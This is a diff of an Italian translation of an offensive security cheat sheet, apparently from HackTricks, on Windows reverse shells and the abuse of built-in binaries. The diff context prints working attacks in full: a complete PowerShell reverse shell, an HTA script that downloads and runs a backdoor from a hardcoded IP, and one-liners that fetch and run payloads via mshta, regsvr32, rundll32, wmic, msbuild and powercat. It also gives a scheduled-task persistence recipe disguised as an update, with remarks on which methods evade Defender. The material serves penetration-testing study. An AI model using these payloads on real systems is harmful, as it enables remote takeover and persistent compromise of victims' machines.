@@ -5,9 +5,9 @@
 ## Lolbas
 
 La pagina [lolbas-project.github.io](https://lolbas-project.github.io/) è dedicata a Windows, proprio come [https://gtfobins.github.io/](https://gtfobins.github.io/) è dedicata a Linux.<sup>[[13]](#references)[[14]](#references)</sup>
-Windows usa access token e privilegi per la sicurezza dei processi, e Windows 11 include anche un comando `sudo` opzionale.<sup>[[11]](#references)[[12]](#references)</sup> È utile sapere **come** alcuni **binari** possano essere usati in modo improprio per eseguire azioni impreviste, come **eseguire codice arbitrario**.<sup>[[13]](#references)</sup>
+Windows usa token di accesso e privilegi per la sicurezza dei processi; Windows 11 include anche un comando `sudo` facoltativo.<sup>[[11]](#references)[[12]](#references)</sup> È utile sapere **come** alcuni **binari** possono essere sfruttati per eseguire azioni impreviste, come **l'esecuzione di codice arbitrario**.<sup>[[13]](#references)</sup>
 
-I payload di reverse shell di base per Windows raccolti di seguito sono documentati anche nei cheat sheet di HighOn.Coffee e PayloadsAllTheThings; adatta i percorsi e gli interpreti installati al target.<sup>[[1]](#references)[[4]](#references)</sup>
+I payload reverse-shell di base per Windows raccolti di seguito sono documentati anche nelle cheat sheet di HighOn.Coffee e PayloadsAllTheThings; adatta i percorsi e gli interpreti installati al target.<sup>[[1]](#references)[[4]](#references)</sup>
 
 ## NC
 
@@ -35,7 +35,7 @@ ncat -l <PORT eg.443> --ssl
 
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) è un'alternativa portatile e sicura a Netcat**. Funziona su sistemi Unix-like e Win32. Grazie a funzionalità come la crittografia avanzata, l'esecuzione di programmi, le porte sorgente personalizzabili e la riconnessione continua, sbd offre una soluzione versatile per la comunicazione TCP/IP. Gli utenti Windows possono usare la versione sbd.exe della distribuzione Kali Linux come sostituto affidabile di Netcat.<sup>[[15]](#references)</sup>
+**[sbd](https://www.kali.org/tools/sbd/) è un'alternativa portatile e sicura a Netcat**. Funziona su sistemi Unix-like e Win32. Grazie a funzionalità come la crittografia avanzata, l'esecuzione di programmi, le porte sorgente personalizzabili e la riconnessione continua, sbd offre una soluzione versatile per le comunicazioni TCP/IP. Gli utenti Windows possono usare la versione sbd.exe della distribuzione Kali Linux come sostituto affidabile di Netcat.<sup>[[15]](#references)</sup>
 
 ```bash
 # Victims machine
@@ -106,7 +106,7 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/Power
 ```
 
 Processo che effettua la chiamata di rete: **powershell.exe**\
-Payload scritto su disco: **NO** (_almeno non in alcun punto che sia riuscito a trovare usando procmon !_).<sup>[[5]](#references)</sup>
+Payload scritto su disco: **NO** (_almeno in nessun posto in cui sia riuscito a trovarlo usando procmon !_).<sup>[[5]](#references)</sup>
 
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
@@ -121,7 +121,7 @@ Payload scritto su disco: **cache locale del client WebDAV**.<sup>[[5]](#referen
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-**Ottieni maggiori informazioni sui diversi Powershell Shell alla fine di questo documento**
+**Ottieni maggiori informazioni sulle diverse shell Powershell alla fine di questo documento**
 
 ## Mshta
 
@@ -139,7 +139,7 @@ mshta http://webserver/payload.hta
 mshta \\webdavserver\folder\payload.hta
 ```
 
-#### **Esempio di hta-psh reverse shell (usa hta per scaricare ed eseguire una backdoor PS)**
+#### **Esempio di reverse shell hta-psh (usa hta per scaricare ed eseguire una backdoor PS)**
 
 ```xml
  <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
@@ -215,7 +215,7 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
 
-**Rilevato da Defender**
+**Rilevato da defender**
 
 **Rundll32 - sct**
 
@@ -252,14 +252,14 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
 
-**Rilevato da defender**
+**Rilevato da Defender**
 
-#### Regsvr32 – export DLL arbitrario con argomento /i (gatekeeping e persistenza)
+#### Regsvr32 – export DLL arbitrario con argomento /i (controllo dell'accesso e persistenza)
 
-Oltre a caricare scriptlet remoti (`scrobj.dll`), `regsvr32.exe` carica una DLL locale e richiama i suoi export `DllRegisterServer`/`DllUnregisterServer`. I custom loader abusano spesso di questa funzionalità per eseguire codice arbitrario camuffandosi da LOLBin firmato. Due note di tradecraft osservate in natura:<sup>[[6]](#references)</sup>
+Oltre a caricare scriptlet remoti (`scrobj.dll`), `regsvr32.exe` carica una DLL locale e richiama gli export `DllRegisterServer`/`DllUnregisterServer`. I custom loader spesso abusano di questa funzionalità per eseguire codice arbitrario camuffandosi da LOLBin firmato. Due note di tradecraft osservate in natura:<sup>[[6]](#references)</sup>
 
-- Argomento di gatekeeping: la DLL termina l’esecuzione a meno che non venga passato uno switch specifico tramite `/i:<arg>`, ad esempio `/i:--type=renderer` per imitare i processi figli renderer di Chromium. Ciò riduce le esecuzioni accidentali e ostacola le sandbox.
-- Persistenza: pianifica l’esecuzione di `regsvr32` per avviare la DLL in modalità silenziosa e con privilegi elevati, includendo l’argomento `/i` richiesto e camuffandola da attività di aggiornamento:
+- Argomento per il controllo dell'accesso: la DLL termina l'esecuzione se non viene passato uno switch specifico tramite `/i:<arg>`, ad esempio `/i:--type=renderer` per imitare i processi renderer di Chromium. Questo riduce le esecuzioni accidentali e rende più difficile il lavoro delle sandbox.
+- Persistenza: pianifica l'esecuzione di `regsvr32` per avviare la DLL in modo silenzioso, con privilegi elevati e l'argomento `/i` richiesto, camuffandola da attività di aggiornamento:
   ```powershell
   Register-ScheduledTask \
     -Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
@@ -270,7 +270,7 @@ Oltre a caricare scriptlet remoti (`scrobj.dll`), `regsvr32.exe` carica una DLL 
     -RunLevel Highest
   ```
 
-Vedi anche: variante ClickFix da clipboard a PowerShell che prepara un loader JS e in seguito persiste con `regsvr32`.<sup>[[6]](#references)</sup>
+Vedi anche: variante ClickFix da clipboard a PowerShell che prepara un loader JS e in seguito mantiene la persistenza tramite `regsvr32`.<sup>[[6]](#references)</sup>
 {{#ref}}
 ../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
 {{#endref}}
@@ -385,7 +385,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 wmic os get /format:"https://webserver/payload.xsl"
 ```
 
-Esempio di file xsl [qui](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7).<sup>[[10]](#references)</sup>
+File xsl di esempio [qui](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7).<sup>[[10]](#references)</sup>
 
 ```xml
 <?xml version='1.0'?>
@@ -401,7 +401,7 @@ Esempio di file xsl [qui](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2
 
 **Non rilevato**
 
-**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic usando lo stager wmic**.<sup>[[3]](#references)</sup>
+**È possibile scaricare ed eseguire molto facilmente uno zombie Koadic usando lo stager wmic**.<sup>[[3]](#references)</sup>
 
 ## Msbuild
 
@@ -411,8 +411,8 @@ Esempio di file xsl [qui](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
 
-Questo progetto documenta MSBuildShell come host PowerShell in grado di aggirare la whitelist delle applicazioni e le restrizioni su `powershell.exe`, fornendo una shell simile a PowerShell.<sup>[[16]](#references)</sup>\
-Basta scaricarlo ed eseguirlo: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj).<sup>[[16]](#references)</sup>
+Questo progetto descrive MSBuildShell come host PowerShell in grado di aggirare l'application whitelisting e le restrizioni di `powershell.exe`, fornendo una shell simile a PowerShell.<sup>[[16]](#references)</sup>\
+Scaricalo ed eseguilo: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj).<sup>[[16]](#references)</sup>
 
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -420,9 +420,11 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 **Non rilevato**
 
+Un progetto C# malevolo può anche eseguire un [target di MSBuild in fase di progettazione quando viene aperto in Visual Studio](../../windows-hardening/visual-studio-project-msbuild-execution.md), prima che qualcuno invochi esplicitamente `MSBuild.exe` o compili il progetto.<sup>[[28]](#references)</sup>
+
 ## **CSC**
 
-Compila codice C# sulla macchina della vittima.<sup>[[17]](#references)[[18]](#references)</sup>
+Compilare codice C# sul computer della vittima.<sup>[[17]](#references)[[18]](#references)</sup>
 
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
@@ -430,7 +432,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe s
 
 Puoi scaricare una reverse shell C# di base da qui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**Non rilevato**
+**Non rilevata**
 
 ## **Regasm/Regsvc**
 
@@ -456,27 +458,27 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2).<sup>[[2]](#references)</sup>
 
-## Shell PowerShell
+## Powershell Shells
 
 ### PS-Nishang
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Nella cartella **Shells** ci sono molti shell diversi. Per scaricare ed eseguire Invoke-_PowerShellTcp.ps1_, fai una copia dello script e aggiungi alla fine del file:<sup>[[19]](#references)</sup>
+Nella cartella **Shells** ci sono molti shell diversi. Per scaricare ed eseguire _Invoke-PowerShellTcp.ps1_, fai una copia dello script e aggiungi in fondo al file:<sup>[[19]](#references)</sup>
 
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
 
-Ospita lo script su un server web ed eseguilo sul sistema della vittima:<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
+Inizia a servire lo script tramite un web server ed eseguilo sul sistema della vittima:<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
 
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 
-Defender non lo rileva come codice malevolo (per ora, 3/04/2019).
+Defender non lo rileva come codice dannoso (per ora, 04/03/2019).
 
-**TODO: Controllare le altre shell di nishang**
+**TODO: Controllare altre shell nishang**
 
 ### **PS-Powercat**
 
@@ -488,11 +490,11 @@ Scaricalo, avvia un web server, avvia il listener ed eseguilo sul sistema della 
  powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
 
-Defender non lo rileva come codice malevolo (ancora, 3/04/2019).
+Defender non lo rileva come codice dannoso (per ora, 3/04/2019).
 
 **Altre opzioni offerte da powercat:**
 
-Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generare payload, Servire file...<sup>[[22]](#references)</sup>
+Bind shells, Reverse shell (TCP, UDP, DNS), reindirizzamento delle porte, upload/download, generazione di payload, hosting di file...<sup>[[22]](#references)</sup>
 
 ```
 Serve a cmd Shell:
@@ -527,7 +529,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Crea una versione PowerShell della backdoor di Metasploit usando Unicorn.<sup>[[24]](#references)</sup>
+Crea una versione PowerShell di una backdoor di Metasploit usando Unicorn.<sup>[[24]](#references)</sup>
 
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
@@ -539,7 +541,7 @@ Avvia msfconsole con la risorsa creata:<sup>[[24]](#references)</sup>
 msfconsole -r unicorn.rc
 ```
 
-Avvia un server web che serva il file _powershell_attack.txt_ ed eseguilo sulla vittima:<sup>[[24]](#references)</sup>
+Avvia un web server che serve il file _powershell_attack.txt_ ed esegui sul sistema vittima:<sup>[[24]](#references)</sup>
 
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
@@ -555,24 +557,24 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## References
 
-- [1] [Cheat sheet delle reverse shell: PHP, ASP, Netcat, Bash e Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+- [1] [Cheat sheet sulle reverse shell: PHP, ASP, Netcat, Bash e Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 - [2] [Gist GitHub di Arno0x](https://gist.github.com/Arno0x)
-- [3] [Koadic – framework di command and control COM](https://www.hackingarticles.in/koadic-com-command-control-framework/)
-- [4] [Cheat sheet delle reverse shell - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [3] [Koadic – Framework COM di comando e controllo](https://www.hackingarticles.in/koadic-com-command-control-framework/)
+- [4] [Cheat sheet sulle reverse shell - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - [5] [One-liner Windows per scaricare un payload remoto ed eseguire codice arbitrario](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
-- [6] [Check Point Research – Sotto la cortina di Pure: da RAT a builder a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
-- [7] [calc.hta – esempio di esecuzione inversa HTA (gist di Arno0x)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
-- [8] [scriptlet.sct – esempio di scriptlet mshta/rundll32 (gist di Arno0x)](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
-- [9] [regsvr32.sct – esempio di scriptlet Regsvr32 (gist di Arno0x)](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-- [10] [wmic.xsl – esempio di foglio di stile XSL WMIC (gist di Arno0x)](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
-- [11] [Token di accesso – app Win32 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
+- [6] [Check Point Research – Sotto la pura cortina: da RAT a builder a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [7] [calc.hta – Esempio di esecuzione inversa HTA (gist di Arno0x)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+- [8] [scriptlet.sct – Esempio di scriptlet mshta/rundll32 (gist di Arno0x)](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+- [9] [regsvr32.sct – Esempio di scriptlet Regsvr32 (gist di Arno0x)](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+- [10] [wmic.xsl – Esempio di foglio di stile XSL WMIC (gist di Arno0x)](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
+- [11] [Token di accesso – App Win32 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
 - [12] [Sudo per Windows (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/advanced-settings/sudo/)
 - [13] [LOLBAS](https://lolbas-project.github.io/)
 - [14] [GTFOBins](https://gtfobins.github.io/)
-- [15] [sbd | Strumenti Kali Linux](https://www.kali.org/tools/sbd/)
+- [15] [sbd | Strumenti di Kali Linux](https://www.kali.org/tools/sbd/)
 - [16] [MSBuildShell](https://github.com/Cn33liz/MSBuildShell)
-- [17] [Opzioni del compilatore – regole delle funzionalità del linguaggio (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/language)
-- [18] [Opzioni del compilatore – opzioni di output (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/output)
+- [17] [Opzioni del compilatore – Regole delle funzionalità del linguaggio (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/language)
+- [18] [Opzioni del compilatore – Opzioni di output (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/output)
 - [19] [Nishang](https://github.com/samratashok/nishang)
 - [20] [Invoke-WebRequest (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1)
 - [21] [Invoke-Expression (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5)
@@ -582,4 +584,5 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 - [25] [WinPwn](https://github.com/SecureThisShit/WinPwn)
 - [26] [Wiki di Empire](https://bc-security.gitbook.io/empire-wiki/)
 - [27] [multi_generate_agent | Wiki di Empire](https://bc-security.gitbook.io/empire-wiki/stagers/multi_generate_agent)
+- [28] [Unit 42 - La campagna Blinder Tunnel prende di mira le infrastrutture irachene](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
 {{#include ../../banners/hacktricks-training.md}}
